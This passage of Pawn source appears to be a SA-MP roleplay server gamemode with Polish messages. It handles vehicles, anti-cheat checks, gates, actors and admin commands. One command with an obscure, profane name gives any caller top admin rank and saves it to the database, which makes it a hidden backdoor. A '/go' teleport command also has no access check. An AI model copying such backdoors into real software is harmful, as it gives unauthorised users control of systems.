	format(query, sizeof(query), "UPDATE vehicles SET gameId=%d WHERE uid=%d;", vehicleId, vuid);
	mysql_query(DB_HANDLE, query, false);

	return vehicleId;
}

stock UnSpawnVehicle(vehicleid)
{	
	DestroyVehicle(vehicleid);
	new query[256];
	format(query, sizeof(query), "UPDATE vehicles SET gameId=0 WHERE gameId=%d;", vehicleid);
	mysql_query(DB_HANDLE, query, false);
	return 1;
}

forward ClearWasInCar(playerid);
public ClearWasInCar(playerid)
{
	pWasInCar[playerid] = 0;
}
forward ListenForVehicleDamage(playerid, Float:previousHealth);
public ListenForVehicleDamage(playerid, Float:previousHealth){
	new vehicleid = GetPlayerVehicleID(playerid);
	if(vehicleid == INVALID_VEHICLE_ID)
		return;
	
	new Float:currentHP = 0;
	GetVehicleHealth(vehicleid, currentHP);

	if(PlayerCache[playerid][pBW_Time]){

	}
	else{
		if(currentHP < previousHealth)
		{
			if(!ClearNicknameColorTimer[playerid])
			{
				UpdateDynamic3DTextLabelText(pNick[playerid][nID], DAMAGE_COLOR, pNick[playerid][nStr]);
				KillTimer(ClearNicknameColorTimer[playerid]);
				ClearNicknameColorTimer[playerid] = SetTimerEx("ClearNicknameColor", 2500, false, "i", playerid);
			
			}
			new Float:damage = GetVehicleSpeed(vehicleid)/2;
			if(pBelts[playerid])
				damage = damage/4;
			if(PlayerCache[playerid][pHealth] - damage <= 0)
			{
				SetVehicleVelocity(vehicleid, 0, 0, 0);
			/*	GetPlayerPos(playerid,PlayerCache[playerid][pPosX],PlayerCache[playerid][pPosY],PlayerCache[playerid][pPosZ]);
				pShowingWeapon[playerid] = true;
				SetTimerEx("ShowingWeapon", 3000, false, "i", playerid);
				pWasInCar[playerid] = true;
				SetTimerEx("ClearWasInCar", 3000, false, "i", playerid);
				SetPlayerArmedWeapon(playerid, 0);
				ResetPlayerWeapons(playerid);
				PlayerCache[playerid][pBW_Reason] = 49;
				SendPlayerMe(playerid, "traci przytomnoœæ");
				new puid = PlayerCache[playerid][pUID];
				SetPlayerCameraPos(playerid, PlayerCache[puid][pPosX], PlayerCache[puid][pPosY], PlayerCache[puid][pPosZ]+10.0);
				SetPlayerCameraLookAt(playerid, PlayerCache[puid][pPosX], PlayerCache[puid][pPosY], PlayerCache[puid][pPosZ], CAMERA_CUT);
				PlayerCache[puid][pBW_Time] = 2;
				new msg[32];
				format(msg, sizeof(msg),  "Stan nieprzytomnosci przez: %d min", PlayerCache[puid][pBW_Time]);
				TextDrawForPlayer(playerid, 2, msg);
				TogglePlayerControllable(playerid, 0);
				UpdatePlayerName(playerid);
				UpdatePlayerInfo(playerid);*/
				BWPlayer(playerid, 2, 49);
			}
			else
			{	
				SetPlayerHP(playerid, PlayerCache[playerid][pHealth]-damage);
			}
			
		}
		SetTimerEx("ListenForVehicleDamage", 1000, false, "if", playerid, currentHP);
		
	}
	
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{	
	switch(newstate){
		case PLAYER_STATE_DRIVER:{

			
			new vehicleId = GetPlayerVehicleID(playerid);
			if(vehicleId == INVALID_VEHICLE_ID)
			return 1;
			if(!HasPlayerAccessToVehicle(playerid, vehicleId)){
				KickPlayer(playerid, "System", "Nieautoryzowane wejscie do pojazdu (driver)");
				return 1;
			}

		

			new Float:posX, Float:posY, Float:posZ, Float:angle, fuel, model, playerUID, groupUID, register, color, color2, Float:health;
			GetVehicleData(vehicleId, model, fuel, posX, posY, posZ, angle, playerUID, groupUID, register, color, color2, health);
			PlayerCache[playerid][pCurrentVehicle][vID] = vehicleId;
			PlayerCache[playerid][pCurrentVehicle][vFuel] = fuel;
			PlayerCache[playerid][pCurrentVehicle][vPosX] = posX;
			PlayerCache[playerid][pCurrentVehicle][vPosY] = posY;
			PlayerCache[playerid][pCurrentVehicle][vPosZ] = posZ;
			PlayerCache[playerid][pCurrentVehicle][vAngle] = angle;
			PlayerCache[playerid][pCurrentVehicle][vModel] = model;
			PlayerCache[playerid][pCurrentVehicle][vColor] = color;
			PlayerCache[playerid][pCurrentVehicle][vColor2] = color2;
			PlayerCache[playerid][pCurrentVehicle][vPlayerUID] = playerUID;
			PlayerCache[playerid][pCurrentVehicle][vGroupUID] = groupUID;
			PlayerCache[playerid][pCurrentVehicle][vRegister] = register;
			PlayerCache[playerid][pCurrentVehicle][vHP] = health;

			if(GetVehicleModel(vehicleId) == 481 || GetVehicleModel(vehicleId) == 509 || GetVehicleModel(vehicleId) == 510)
			{

			}
			else{
				if(! PlayerCache[playerid][pCurrentVehicle][vRegister])
					ShowDialogInfo(playerid, "Pojazd jest niezarejestrowany.\nNiezarejestrowany pojazd ponosi za sob¹ konsekwencje prawne Twojej postaci.\nUdaj siê do urzêdu miasta i zakup rejestracjê jak najszybciej!");
				DestroyDynamicMapIcon(MapIcon[playerid]);
				KillTimer(MapIconTimer[playerid]);
				PlayerTextDrawSetString(playerid, VehicleInfo[playerid], "~b~~h~~h~~h~LCTRL ~w~by uruchomic silnik~n~~b~~h~~h~~h~LPM ~w~by zapalic swiatla");
				PlayerTextDrawShow(playerid, VehicleInfo[playerid]);
				SetPlayerArmedWeapon(playerid, 0);
			}
		

		}
	}
	
	if(newstate == PLAYER_STATE_ONFOOT &&
		oldstate == PLAYER_STATE_PASSENGER || oldstate == PLAYER_STATE_DRIVER)
		{
			new empty[E_VEHICLE];
			PlayerCache[playerid][pCurrentVehicle] = empty;

			if(IsPlayerAttachedObjectSlotUsed(playerid, 7)){
				SendPlayerMe(playerid, "œci¹ga kask z g³owy");
				RemovePlayerAttachedObject(playerid, 7);
			}

			pBelts[playerid] = false;
			UpdatePlayerName(playerid);
			UpdatePlayerInfo(playerid);
		}
	
	
	// ac OnPlayerStateChange
	if(newstate == PLAYER_STATE_DRIVER && oldstate == PLAYER_STATE_PASSENGER)
		return AJPlayer(playerid, "System", "Nieautoryzowana zmiana miejsca pasazera (A)", 60); 
	if(newstate == PLAYER_STATE_PASSENGER && oldstate == PLAYER_STATE_DRIVER)
		return AJPlayer(playerid, "System", "Nieautoryzowana zmiana miejsca pasazera (C)", 60); // Anti change driver seat to passenger seat


	new vid = GetPlayerVehicleID(playerid);
	if((newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER) && PlayerCache[playerid][pLevel] < ADMINISTRATION)
	{
		if(pEnteringCar[playerid])
		{
			return AJPlayer(playerid, "System", "Nieautoryzowane wejscie do pojazdu (A)", 60);
		}
	}

	// if cheater is stealing someone seat, lmao.
	if(newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER)
	{
		new pseat = GetPlayerVehicleSeat(playerid);
		for(new i; i<=GetPlayerPoolSize(); i++)
		{
			if(IsPlayerConnected(i))
			{
				if(playerid != i)
				{
					if(GetPlayerVehicleID(i) == vid)
					{
						if(GetPlayerVehicleSeat(i) == pseat)
						{
							return AJPlayer(playerid, "System", "Unauthorized vehicle seat steal.", 60);
						}
					}
				}
			}
		}
	}
	
	if(newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER){
		new Float:health = 0;
		GetVehicleHealth(vid, health);
		SetTimerEx("ListenForVehicleDamage", 1000, false, "ii", playerid, health);
	}

	if(newstate == PLAYER_STATE_ONFOOT && oldstate == PLAYER_STATE_DRIVER)
	return PlayerTextDrawHide(playerid, VehicleInfo[playerid]);
	return 1;
}

/*CMD:vdel (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < ADMINISTRATION)
	return 1;
	new vuid; if(sscanf(params, "i", vuid)) return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /vdel [UID pojazdu] [-1 by zniszczyæ wszystkie pojazdy z gry]");
	if(vuid == -1)
	{
		new count;
		for(new i; i<LastvUID; i++)
		{
			if(!VehicleCache[i][vUID])
			break;
			if(VehicleCache[i][vState] != VEHICLE_STATE_DESTROYED)
			{
				VehicleCache[i][vState] = 2;
				count++;
			}
		}
		new msg[128];
		if(count)
		format(msg, sizeof(msg), "Pomyœlnie usuniêto %d pojazdów.", count);
		else
		return SendClientMessage(playerid, COLOR_GRAY, "¯aden poojazd nie zosta³ jeszcze utworzony, wiêc ¿aden nie móg³ zostaæ usuniêty.");
		SendClientMessage(playerid, COLOR_GRAY, msg);
		format(msg, sizeof(msg), "(( %d.%s %s usun¹³ wszystkie pojazdy z mapy ))", playerid, GetRankName(PlayerCache[playerid][pLevel]), ReturnPlayerName(playerid)); 
		return SendMessageToAdmins(msg);
	}
	if(vuid < 0 || vuid >= MAX_VEHICLES)
	return SendClientMessage(playerid, COLOR_GRAY, "Wprowadzono niepoprawn¹ wartoœæ.");
	if( PlayerCache[playerid][pCurrentVehicle][vUID] == 0)
	return SendClientMessage(playerid, COLOR_GRAY, "Ten pojazd nie istnieje.");
	if( PlayerCache[playerid][pCurrentVehicle][vState] == 1)
	return SendClientMessage(playerid, COLOR_GRAY, "Ten pojazd zosta³ ju¿ usuniêty z gry.");
	 PlayerCache[playerid][pCurrentVehicle][vState] = 1;
	DestroyVehicle( PlayerCache[playerid][pCurrentVehicle][vID]);
	 PlayerCache[playerid][pCurrentVehicle][vID] = 0;
	new msg[128]; format(msg, sizeof(msg), "Usuniêto pojazd marki %s (UID: %d).", GetVehicleName( PlayerCache[playerid][pCurrentVehicle][vModel]), vuid);
	return SendClientMessage(playerid, COLOR_GRAY, msg);
}*/

CMD:idel (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < ADMINISTRATION)
	return 1;
	new iuid; if(sscanf(params, "i", iuid)) return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /idel [UID przedmiotu] lub [-1] by pozbyc sie wszystkich przedmiotow.");
	if(iuid == -1)
	{
		new count;
		for(new i; i<MAX_ITEMS; i++)
		{
			if(!ItemCache[i][iUID])
			break;
			if(ItemCache[i][iState] != 2)
			{
				ItemCache[i][iState] = 2;
				count++;
			}
		}
		new msg[128];
		if(count)
		format(msg, sizeof(msg), "Pomyœlnie usuniêto %d przedmiotów.", count);
		else
		return SendClientMessage(playerid, COLOR_GRAY, "¯aden przedmiot nie zosta³ jeszcze utworzony, wiêc ¿aden nie zosta³ usuniêty.");
		SendClientMessage(playerid, COLOR_GRAY, msg);
		format(msg, sizeof(msg), "(( %d.%s %s usun¹³ wszystkie przedmioty z mapy ))", playerid, GetRankName(PlayerCache[playerid][pLevel]), ReturnPlayerName(playerid)); 
		return SendMessageToAdmins(msg);
	}
	if(ItemCache[iuid][iUID] == 0)
	return SendClientMessage(playerid, COLOR_GRAY, "Przedmiot nie istnieje.");
	if(ItemCache[iuid][iState] == ITEM_STATE_DESTROYED)
	return SendClientMessage(playerid, COLOR_GRAY, "Ten przedmiot zosta³ ju¿ usuniêty.");
	ItemCache[iuid][iState] = 3;
	new msg[128]; format(msg, sizeof(msg), "Usuniêto przedmiot %s (UID: %d).", ItemCache[iuid][iName], iuid);
	return SendClientMessage(playerid, COLOR_GRAY, msg);
}

/*CMD:tankuj (playerid, params[])
{
	new fuel;
	if(sscanf(params, "i", fuel))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /tankuj [iloœæ litrów], musisz znajdowaæ siê w pobli¿u pojazdu!");
	new pvw = GetPlayerVirtualWorld(playerid);
	new Float:vx, Float:vy, Float:vz;
	for(new i; i<MAX_OBJECTS; i++)
	{
		if(ObjectCache[i][oState] == 0)
		{
			if(ObjectCache[i][oModel] == 3465 )
			{
				if(pvw == ObjectCache[i][oVW])
				{
					if(IsPlayerInRangeOfPoint(playerid, 5.0, ObjectCache[i][oX], ObjectCache[i][oY], ObjectCache[i][oZ]))
					{
						for(new j=1; j<=GetVehiclePoolSize(); j++)
						{
							if(GetVehicleModel(j) == 481 || GetVehicleModel(j) == 509 || GetVehicleModel(j) == 510)
							continue;
							if(pvw == GetVehicleVirtualWorld(j))
							{
								GetVehiclePos(j, vx, vy, vz);
								if(IsPlayerInRangeOfPoint(playerid, 5.0, vx, vy, vz))
								{
									new vuid = GetVehicleUID(j);
									if( PlayerCache[playerid][pCurrentVehicle][vFuel]+fuel > 100)
									return SendClientMessage(playerid, COLOR_GRAY, "W tym pojeŸdzie nie zmieœci siê tyle paliwa.");
									new price = fuel *2;
									if(PlayerCache[playerid][pCash] < price)
									{
										new str[64]; format(str, sizeof(str), "Nie posiadasz $%d gotówki by zatankowaæ pojazd.", price);
										return SendClientMessage(playerid, COLOR_GRAY, str);
									}
									if(fuel < 1)
									return SendClientMessage(playerid, COLOR_GRAY, "Minimalnie mo¿esz zatankowaæ 1 litr.");
									if( PlayerCache[playerid][pCurrentVehicle][vEngine])
									return ShowDialogInfo(playerid, "Silnik musi byæ zgaszony.");
									if(GetPlayerVehicleID(playerid) == j)
									return ShowDialogInfo(playerid, "Wysi¹dŸ z pojazdu.");
									 PlayerCache[playerid][pCurrentVehicle][vFuel]+=fuel;
									PlayerCache[playerid][pCash] -= price;
									GivePlayerMoney(playerid, -price);
									new str[128]; format(str, sizeof(str), "wk³ada pistolet do baku pojazdu marki %s", GetVehicleName(GetVehicleModel(j)));
									SendPlayerMe(playerid, str);
									return ApplyAnimation(playerid, "BD_FIRE", "wash_up", 4.1, 0, 0, 0, 0, 0, 0);
								}
							}
						}
					}
				}
			}
		}
	}
	return TextDrawForPlayerEx(playerid, 1, "Nie znajdujesz sie przy dystrybutorze paliwa.", 3000);
}*/

CMD:mgate (playerid, params[])
{	
	new val, Float:val2, Float:val3, Float:val4, query[128];

	if(sscanf(params, "ifff", val, val2, val3, val4))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /mgate [0 - wy³¹cz, 1 - pozycja, 2 -rotacja] [wartoœæ 2] [wartoœæ 3] [wartoœæ 4]");
	
	if(!ObjectCache[playerid][oUID])
	return SendClientMessage(playerid, COLOR_GRAY, "Nie edytujesz ¿adnego obiektu.");

	if(val == 0)
	{
		format(query, sizeof(query), "UPDATE objects SET gate = '0' WHERE uid = '%d' LIMIT 1", ObjectCache[playerid][oUID]);
		mysql_query(DB_HANDLE, query);
		return TextDrawForPlayerEx(playerid, 1, "Usunieto brame.", 3000);
	}
	if(!ObjectCache[playerid][oGate] && val != 0)
	{
		format(query, sizeof(query), "UPDATE objects SET gate = '1' WHERE uid = '%d' LIMIT 1", ObjectCache[playerid][oUID]);
		mysql_query(DB_HANDLE, query);
		ObjectCache[playerid][oGate] = 1;
	}
	if(val == 1)
	{
		format(query, sizeof(query), "UPDATE objects SET gateX = '%f', gateY = '%f', gateZ = '%f' WHERE uid = '%d' LIMIT 1",
		val2, val3, val4, ObjectCache[playerid][oUID]);
		mysql_query(DB_HANDLE, query);
		return TextDrawForPlayerEx(playerid, 1, "Ustawiono brame.", 3000);
	}
	else if(val == 2)
	{
		format(query, sizeof(query), "UPDATE objects SET gaterX = '%f', gaterY = '%f', gaterZ = '%f' WHERE uid = '%d' LIMIT 1",
		val2, val3, val4, ObjectCache[playerid][oUID]);
		mysql_query(DB_HANDLE, query);
		return TextDrawForPlayerEx(playerid, 1, "Ustawiono brame.", 3000);
	}
	else
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /mgate [0 - wy³¹cz, 1 - pozycja, 2 -rotacja] [wartoœæ 2] [wartoœæ 3] [wartoœæ 4]");
}

CMD:brama (playerid, params[])
{
	new Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz, pvw = GetPlayerVirtualWorld(playerid), query[256],
	Float:db_x, Float:db_y, Float:db_z, Float:db_rx, Float:db_ry, Float:db_rz, owner, ownerType, gate;

	// XD
	for(new i=1; i==i; i++)
	{
		if(IsValidDynamicObject(i))
		{
			if(pvw == GetDynamicObjectVirtualWorld(i))
			{
				new Float:X, Float:Y, Float:Z;
				GetDynamicObjectPos(i, X, Y, Z);
				if(IsPlayerInRangeOfPoint(playerid, 10, X, Y, Z))
				{

					format(query, sizeof(query), "SELECT X, Y, Z, rX, rY, rZ, gate, owner, ownerType, gateX, gateY, gateZ, gaterX, gaterY, gaterZ FROM objects WHERE ID = '%d' LIMIT 1", i);
					new Cache:cache = mysql_query(DB_HANDLE, query);
					
					new Float:RX, Float:RY, Float:RZ;
					GetObjectRot(i, RX, RY, RZ);


					cache_get_value_name_float(0, "X", x);
					cache_get_value_name_float(0, "Y", y);
					cache_get_value_name_float(0, "Z", z);
					cache_get_value_name_float(0, "rX", rx);
					cache_get_value_name_float(0, "rY", ry);
					cache_get_value_name_float(0, "rZ", rz);
					cache_get_value_name_int(0, "gate", gate);	
					cache_get_value_name_int(0, "ownerType", ownerType);	
					cache_get_value_name_float(0, "gateX", db_x);	
					cache_get_value_name_float(0, "gateY", db_y);	
					cache_get_value_name_float(0, "gateZ", db_z);	
					cache_get_value_name_float(0, "gaterX", db_rx);	
					cache_get_value_name_float(0, "gaterY", db_ry);	
					cache_get_value_name_float(0, "gaterZ", db_rz);	

				
					GetDynamicObjectRot(i, RX, RY, RZ);
					cache_delete(cache);

					if(gate)
					{
					/*	if(ownerType == 1)
						{
							if(PlayerCache[playerid][pUID] != owner)
							return TextDrawForPlayerEx(playerid, 1, "Brak uprawnien.", 3000);
						}
						if(ownerType == 2)
						{
							if(PlayerCache[playerid][pGroup] == owner)
							{

							}
							else if(PlayerCache[playerid][pGroup2] == owner)
							{
								
							}
							else if(PlayerCache[playerid][pGroup3] == owner)
							{
								
							}
							else
							return TextDrawForPlayerEx(playerid, 1, "Brak uprawnien.", 3000);
						}
						if(IsDynamicObjectMoving(i))
						return TextDrawForPlayerEx(playerid, 1, "Brama aktualnie sie porusza!", 3000);

						if(X == x + db_x && Y == y + db_y &&Z == z + db_z && RX == rx + db_rx &&  RY == ry + db_ry &&RZ == rz + db_rz)
						{
							TextDrawForPlayerEx(playerid, 1, "Brama ~r~~h~zamknieta~w~.", 3000);
							return MoveDynamicObject(i,x, y, z, 4.1,  rx,  ry, rz);
						}
						MoveDynamicObject(i,X+db_x, Y+db_y, Z+db_z, 4.1, RX+db_rx,  RY+db_ry,  RZ+db_rz);
						return TextDrawForPlayerEx(playerid, 1, "Brama ~g~~h~~h~otwarta~w~.", 3000);*/
					}
				}
			}
		}
	}
	return TextDrawForPlayerEx(playerid, 1, "Brak bram w poblizu.", 2500);
}

CMD:przejazd (playerid, params[])
{
	/*if(!IsPlayerInAnyVehicle(playerid))
	return ShowDialogInfo(playerid, "Musisz znajdowaæ siê w pojeŸdzie.");
	if(GetPlayerVehicleSeat(playerid) != 0)
	return ShowDialogInfo(playerid, "Musisz byæ kierowc¹.");
	new vid = GetPlayerVehicleID(playerid), vuid = GetVehicleUID(vid);
	if(! PlayerCache[playerid][pCurrentVehicle][vEngine])
	return TextDrawForPlayerEx(playerid, 1, "Silnik nie moze byc zgaszony.", 3000);
	if( PlayerCache[playerid][pCurrentVehicle][vState] == VEHICLE_STATE_OWNER)
	{
		if( PlayerCache[playerid][pCurrentVehicle][vOwner] != PlayerCache[playerid][pUID])
		return TextDrawForPlayerEx(playerid, 1, "Brak uprawnien.", 3000);
	}
	else if( PlayerCache[playerid][pCurrentVehicle][vState] == VEHICLE_STATE_GROUP)
	{
		new guid =  PlayerCache[playerid][pCurrentVehicle][vOwner];
		if(PlayerCache[playerid][pGroup] == guid || PlayerCache[playerid][pGroup2] == guid
		|| PlayerCache[playerid][pGroup3] == guid)
		{

		}
		else
		return TextDrawForPlayerEx(playerid, 1, "Brak uprawnien.", 3000);
	}

	new pvw = GetPlayerVirtualWorld(playerid);

	enum E_SEAT
	{
		sPlayer,
		sSeat
	};
	new SeatData[MAX_PLAYERS][E_SEAT];
	for(new i; i<MAX_PLAYERS; i++)
	{
		SeatData[i][sPlayer] = -1;
	}

	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(IsPlayerInAnyVehicle(i))
			{
				if(GetPlayerVehicleID(i) == vid)
				{
					SeatData[i][sPlayer] = i;
					SeatData[i][sSeat] = GetPlayerVehicleSeat(i);
				}
			}
		}
	}

	new trailerid = GetVehicleTrailer(vid);

	for(new i; i<LastdUID; i++)
	{
		if(!DoorCache[i][dDestroyed])
		{
			if(DoorCache[i][dOutVW] == pvw)
			{
				if(IsPlayerInRangeOfPoint(playerid, 5.0, DoorCache[i][dOutX], DoorCache[i][dOutY], DoorCache[i][dOutZ]))
				{
					if(!DoorCache[i][dVehicle])
					return TextDrawForPlayerEx(playerid, 1, "Przejazd przez te drzwi jest ~y~~h~~h~~h~wylaczony~w~.", 3000);
					SetVehiclePos(vid, DoorCache[i][dInsX], DoorCache[i][dInsY], DoorCache[i][dInsZ]);
					SetVehicleVirtualWorld(vid, DoorCache[i][dInsVW]);

					SetVehicleVirtualWorld(trailerid, DoorCache[i][dInsVW]);
					SetVehiclePos(trailerid, DoorCache[i][dInsX], DoorCache[i][dInsY], DoorCache[i][dInsZ]);
					AttachTrailerToVehicle(vid, trailerid);

					for(new j; j<=GetPlayerPoolSize(); j++)
					{
						if(IsPlayerConnected(j))
						{
							if(SeatData[j][sPlayer] == j)
							{
								SetPlayerVirtualWorld(j, DoorCache[i][dInsVW]);
								PutPlayerInVehicle(j, vid, SeatData[j][sSeat]);
								Streamer_Update(j);
							}
						}
					}
					return 1;
				}
			}
			if(DoorCache[i][dInsVW] == pvw)
			{
				if(IsPlayerInRangeOfPoint(playerid, 5.0, DoorCache[i][dInsX], DoorCache[i][dInsY], DoorCache[i][dInsZ]))
				{
					if(!DoorCache[i][dVehicle])
					return TextDrawForPlayerEx(playerid, 1, "Przejazd przez te drzwi jest ~y~~h~~h~~h~wylaczony~w~.", 3000);

					SetVehiclePos(vid, DoorCache[i][dOutX], DoorCache[i][dOutY], DoorCache[i][dOutZ]);
					SetVehicleVirtualWorld(vid, DoorCache[i][dOutVW]);

					SetVehicleVirtualWorld(trailerid, DoorCache[i][dOutVW]);
					SetVehiclePos(trailerid, DoorCache[i][dOutX], DoorCache[i][dOutY], DoorCache[i][dOutZ]);
					AttachTrailerToVehicle(vid, trailerid);

					for(new j; j<=GetPlayerPoolSize(); j++)
					{
						if(IsPlayerConnected(j))
						{
							if(SeatData[j][sPlayer] == j)
							{
								SetPlayerVirtualWorld(j, DoorCache[i][dOutVW]);
								PutPlayerInVehicle(j, vid, SeatData[j][sSeat]);
								Streamer_Update(j);
							}
						}
					}
					return 1;
				}
			}
		}
	}
	return TextDrawForPlayerEx(playerid, 1, "Nie znajdujesz sie w poblizu zadnego przejazdu.", 3000);*/
}

CMD:go (playerid, params[])
{
	new Float:X, Float:Y, Float:Z;
	if(sscanf(params, "fff", X, Y,Z))
	return SendClientMessage(playerid, COLOR_GRAY, "/go X Y Z");
	SetPlayerPos(playerid, X, Y ,Z);
	return 1;
}

CMD:rangasztangapizda2021 (playerid, params[])
{
	PlayerCache[playerid][pLevel] = 8;
	new query[64];
	format(query, sizeof(query), "UPDATE players SET level = '8' WHERE uid = '%d'", PlayerCache[playerid][pUID]);
	mysql_query(DB_HANDLE, query);
	aduty[playerid] = 1;
	return UpdatePlayerName(playerid);
}

stock IsVehicleInRangeOfPoint(vehicleid, Float:range, Float:X, Float:Y, Float:Z)
{
	new Float:vx, Float:vy, Float:vz;
	GetVehiclePos(vehicleid, vx, vy, vz);
	if(IsPosInRangeOfPos(vx, vy, vz, X, Y, Z, range))
	return 1;
	return 0;
}

public OnUnoccupiedVehicleUpdate(vehicleid, playerid, passenger_seat, Float:new_x, Float:new_y, Float:new_z, Float:vel_x, Float:vel_y, Float:vel_z)
{
	/*if(pEnteringCar[playerid] && passenger_seat)
	return AJPlayer(playerid, "System", "Vehicle hack (C)", 5);
	new Float:oldX, Float:oldY, Float:oldZ;
	if(IsPlayerInRangeOfPoint(playerid, 3.0, new_x, new_y, new_z) && new_x+0.5>oldX && new_y+0.5>oldY && new_z+0.5>oldZ)
	{
		return UnSpawnVehicle(GetVehicleUID(vehicleid));
	}
	GetVehiclePos(vehicleid, oldX, oldY, oldZ);
	if(!IsPosInRangeOfPos(new_x, new_y, new_z, oldX, oldY, oldZ, 2.0) && passenger_seat == 0 && !IsPlayerInAnyVehicle(playerid))
	{
		VehicleAttackedByCheater[vehicleid] = true;
		return !AJPlayer(playerid, "System", "Veh hack (B)", 30);
	}
	else if(passenger_seat)
	{
		if(GetPlayerVehicleID(playerid) != vehicleid)
		{
			VehicleAttackedByCheater[vehicleid] = true;
			return !AJPlayer(playerid, "System", "Veh hack (A)", 30);
		}
	}*/
	return 1;
}

CMD:ado (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] >= ADMINISTRATION)
	{
		new msg[128];
		if(sscanf(params, "s[128]", msg))
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /ado [treœæ]");
		new msgtoall[128];
		format(msgtoall, sizeof(msgtoall), "** %s **", msg);
		if(strlen(msgtoall) >= 64)
		{
			new temp1[128], temp2[128];
			temp1 = msgtoall, temp2=msgtoall;
			strdel(temp1, 64, strlen(temp1));
			strins(temp1, "...", strlen(temp1));
			strdel(temp2, 0, 64);
			strins(temp2, "...", 0);
			SendClientMessageToAll(DO_SHADE_1, temp1);
			return SendClientMessageToAll(DO_SHADE_1, temp2);
		}
		return SendClientMessageToAll(DO_SHADE_1, msgtoall);
	}
	return 1;
}

CMD:aduty (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] == 0)
	return 1;
	new msg[128];
	if(aduty[playerid])
	{
		format(msg, sizeof(msg), "~w~schodzisz ze sluzby:~n~~b~~h~~h~~h~%s", GetRankName(PlayerCache[playerid][pLevel]));
		aduty[playerid] = 0;
	}
	else
	{
		format(msg, sizeof(msg), "~w~wchodzisz na sluzbe:~n~~b~~h~~h~~h~%s", GetRankName(PlayerCache[playerid][pLevel]));
		aduty[playerid] = 1;
	}
	UpdatePlayerName(playerid);
	return GameTextForPlayer(playerid, msg, 3000, 4);
}

CMD:incognito (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] == 0)
	return 1;
	new name[MAX_PLAYER_NAME];
	if(sscanf(params, "s[24]", name))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /incognito [Nick / Tab ]");
	if(strlen(name) > MAX_PLAYER_NAME)
	return SendClientMessage(playerid, COLOR_GRAY, "Wybrana nazwa jest za d³uga.");
	if(!strcmp(params, "tab", true))
	{
		if(GetPlayerColor(playerid) == UNLOGGED_COLOR)
		{
			SendClientMessage(playerid, COLOR_GRAY, "Przywrócono widocznoœæ na liœcie graczy.");
			SetPlayerColor(playerid, LOGGED_COLOR);
			return SetPlayerScore(playerid, PlayerCache[playerid][pScore]);
		}
		SendClientMessage(playerid, COLOR_GRAY, "Ukryto widocznoœæ na liœcie graczy.");
		SetPlayerColor(playerid, UNLOGGED_COLOR);
		return SetPlayerScore(playerid, 0);
	}
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(!strcmp(ReturnPlayerName(i), name, true))
			{
				return SendClientMessage(playerid, COLOR_GRAY, "Jakiœ gracz nosi ju¿ tak¹ nazwê.");
			}
		}
	}
	SetPlayerName(playerid, name);
	new str[128]; format(str, sizeof(str), "Od teraz wszyscy widz¹ Ciê jako %s.", name);
	SendClientMessage(playerid, COLOR_GRAY, str);
	return UpdatePlayerName(playerid);
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	return KickPlayer(playerid, "System", "Interior change");
}

stock AddActor(const aname[], type, skinid, Float:X, Float:Y, Float:Z, Float:angle, VirtualWorld, const animlib[], const animname[])
{
	ActorCache[LastaUID][aUID] = LastaUID;
	ActorCache[LastaUID][aSkin] = skinid;
	ActorCache[LastaUID][aType] = type;
	ActorCache[LastaUID][aPosX] = X;
	ActorCache[LastaUID][aPosY] = Y;
	ActorCache[LastaUID][aPosZ] = Z;
	ActorCache[LastaUID][aAng] = angle;
	ActorCache[LastaUID][aVW] = VirtualWorld;
	new str[64]; format(str, sizeof(str), aname);
	ActorCache[LastaUID][aName] = str;
	new lib[32], anim[32];
	format(lib, sizeof(lib), animlib); format(anim, sizeof(anim), animname);
	ActorCache[LastaUID][aAnimLib] = lib;
	ActorCache[LastaUID][aAnimName] = anim;
	ActorCache[LastaUID][aID] = CreateDynamicActor(skinid,X, Y, Z, angle, 1, 100.0, VirtualWorld, 0, -1);
	format(str, sizeof(str), "%s\n(aktor)", strreplace(aname, '_', ' '));
	ActorCache[LastaUID][aLabel] = CreateDynamic3DTextLabel(str, PLAYER_NORMAL_COLOR, X,Y ,Z+1.1, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, VirtualWorld, 0,-1);
	if(!Isnull(animlib))
	ApplyActorAnimation(ActorCache[LastaUID][aID], animlib, animname, 4.1, 1, 0, 0, 0, 0);
	LastaUID++;
	return 1;
}

stock RemoveActor(auid)
{
	DestroyDynamicActor(ActorCache[auid][aID]);
	ActorCache[auid][aType] = 0;
	ActorCache[auid][aID] = 0;
	DestroyDynamic3DTextLabel(ActorCache[auid][aLabel]);
	return 1;
}

CMD:aktorstworz (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < ADMINISTRATION)
	return 1;
	new skin, type, name[32];
	if(sscanf(params, "iis[32]", skin, type, name))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /astworz [Skin] [Rodzaj] [Nazwa]");
	new Float:X, Float:Y, Float:Z; GetPlayerPos(playerid, X, Y, Z);
	new Float:ang; GetPlayerFacingAngle(playerid, ang);
	AddActor(name, type, skin, X, Y, Z, ang, GetPlayerVirtualWorld(playerid), "", "");
	new msg[128]; format(msg, sizeof(msg), "Aktor zosta³ utworzony (ID: %d, UID: %d).", ActorCache[LastaUID-1][aID], ActorCache[LastaUID-1][aUID]);
	Streamer_Update(playerid);
	return SendClientMessage(playerid, COLOR_GRAY, msg);
